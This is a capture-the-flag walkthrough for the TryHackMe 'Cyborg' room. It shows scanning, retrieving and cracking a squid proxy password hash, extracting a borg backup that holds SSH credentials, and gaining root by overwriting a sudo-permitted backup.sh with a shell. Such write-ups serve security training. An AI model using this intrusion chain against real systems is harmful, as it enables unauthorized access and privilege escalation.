# [CYBORG | TryHackMe](https://tryhackme.com/room/cyborgt8)

 Compromise the machine and read the user.txt and root.txt

# SCANNING STEPS
## STEP 1 :

**- NO ROBOTS.TXT FOUND**

**- NOTHING ON SOURCE CODE**

Scanning url and paths

```bash
gobuster -u $IP -w $Wordlist
```
Found **2** Paths :

**/etc**

**/admin**

Scanning ports

```bash
nmap -p -sV -sC $ip
```

Found **2** Ports :


Scan the machine, how many ports are open?

**2**

What service is running on port 80?

**80 HTTP**



What service is running on port 22?

**22 SSH**

## STEP 2 :

Checking **/admin** path

Sensitive information Found 

```text
                ############################################
                ############################################
                [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
                ############################################
                ############################################
```


a mention of **my backup "music_archive"**

## STEP 3 :

Checking **/etc** path

Passwords found

```bash
curl -u $IP/etc/squid/passwd

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

**unhashing** the password using **John The Ripper**.

```bash
john hash.txt --wordlist=wordlist.txt

squidborg
```

## STEP 4 :

There was a download in the **/admin** path

```bash
http://10.10.107.46/admin/archive.tar
```

containes **Archives** and **music_backup**


# EXPLOITING STEPS :

Installing borg backup
## STEP 1 :
```bash
sudo apt install borgbackup -y
borg extract home/field/dev/final_archive/::music_archive
```

The password to extract was **squidborg**

```bash
-rw-r--r-- root   root         71 Tue, 2020-12-29 14:57:14 home/alex/Documents/note.txt

Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

## STEP 2 :


Connecting to **SSH**

```bash
ssh alex@$ip
password : S3cretP@s3

ls
cat user.txt
```

**FOUND THE USER.TXT**

## STEP 3

Checking the sudo previleges 

```bash
sudo -l

(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

We can access to **/etc/mp3backups/backup.sh**

Edit **backup.sh**
```bash
alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh 
alex@ubuntu:/etc/mp3backups$ cat > backup.sh << EOF
> #!/bin/bash
> /bin/bash
> EOF
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
root@ubuntu:/etc/mp3backups# cd /root
root@ubuntu:/root# cat root.txt
```

**FOUND THE ROOT.TXT KEY**










